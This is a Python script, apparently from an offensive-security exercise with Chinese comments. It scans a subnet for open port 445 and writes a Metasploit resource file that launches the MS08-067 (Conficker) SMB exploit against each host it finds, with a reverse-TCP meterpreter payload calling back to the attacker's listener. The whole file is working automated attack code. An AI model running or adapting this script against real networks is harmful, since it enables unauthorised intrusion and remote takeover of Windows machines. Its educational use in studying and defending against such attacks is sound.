#!/usr/bin/python
#coding=utf-8

import nmap

def findTgts(subNet):
	nmScan = nmap.PortScanner()
	nmScan.scan(subNet,'445')
	tgtHosts = []
	for host in nmScan.all_hosts():
		#若目标主机存在TCP的445端口
		if nmScan[host].has_tcp(445):
			state = nmScan[host]['tcp'][445]['state']
			#并且445端口是开启的
			if state == 'open':
				print '[+] Found Target Host: ' + host
				tgtHosts.append(host)
	return tgtHosts

def setupHandler(configFile,lhost,lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('exploit -j -z\n')

	#设置全局变量DisablePayloadHandler，让已经新建一个监听器之后，后面的所有的主机不会重复新建监听器
	#其中setg为设置全局参数
	configFile.write('setg DisablePayloadHandler 1\n')

def confickerExploit(configFile,tgtHost,lhost,lport):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST ' + str(tgtHost) + '\n')
	configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')

	#-j参数表示攻击在后台进行，-z参数表示攻击完成后不与会话进行交互
	configFile.write('exploit -j -z\n')